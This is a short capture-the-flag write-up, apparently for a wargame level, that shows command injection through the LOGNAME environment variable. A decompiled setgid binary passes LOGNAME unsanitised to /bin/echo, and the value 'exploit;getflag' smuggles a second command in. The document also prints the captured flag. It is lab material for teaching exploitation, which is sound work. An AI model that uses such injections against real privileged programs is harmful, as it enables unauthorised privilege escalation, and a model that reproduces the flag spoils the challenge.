# level07

1. examinate existing files permissions

```shell
ls -la
```

shows that the level07 executable belongs to flag07 group

2. get the executable (from an external device)

```shell
scp -P 4242 level07@<host>:level07 .
```

3. decompile the executable and examine the resulting code

```shell
~/dev/tools/retdec/bin/retdec-decompiler.py level07
```

shows `asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));` which permits arbitrary code execution

4. tweak the environment variables

```shell
LOGNAME='exploit;getflag'
```

5. pwn the flag

```shell
./level07
```

gives flag: `fiumuikeil55xe9cu4dood66h`
